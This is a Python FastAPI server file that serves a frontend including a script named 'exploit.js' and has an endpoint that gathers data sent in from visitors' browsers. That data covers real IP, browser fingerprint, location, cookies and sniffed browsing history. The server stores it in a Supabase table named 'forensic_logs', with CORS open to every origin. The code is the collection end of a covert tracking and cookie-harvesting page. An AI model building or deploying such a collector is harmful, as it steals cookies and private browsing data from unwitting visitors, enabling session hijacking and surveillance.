from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse
from fastapi.staticfiles import StaticFiles
import requests
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")

# Initialize FastAPI
app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"]
)

# -----------------------------------
# Serve frontend files (index.html + exploit.js)
# -----------------------------------

# Mount the frontend folder as static files
# "../frontend" because main.py is inside backend/
frontend_path = os.path.join(os.path.dirname(__file__), "../frontend")
app.mount("/static", StaticFiles(directory=frontend_path), name="static")

# Serve index.html at root URL
@app.get("/")
def serve_index():
    return FileResponse(os.path.join(frontend_path, "index.html"))

# -----------------------------------
# Your existing POST endpoint
# -----------------------------------
@app.post("/functions/v1/collect")
async def collect_data(req: Request):
    body = await req.json()
    headers = {
        "apikey": SUPABASE_KEY,
        "Authorization": f"Bearer {SUPABASE_KEY}",
        "Content-Type": "application/json"
    }
    data = {
        "real_ip": body.get("real_ip"),
        "fingerprint": body.get("fingerprint"),
        "location": body.get("location"),
        "referrer": body.get("referrer"),
        "screen": body.get("screen"),
        "cookies": body.get("cookies"),
        "history_sniffed": body.get("history_sniffed")
    }
    response = requests.post(
        f"{SUPABASE_URL}/rest/v1/forensic_logs",
        json=data,
        headers=headers
    )
    return {"status": "logged", "supabase_status": response.status_code}
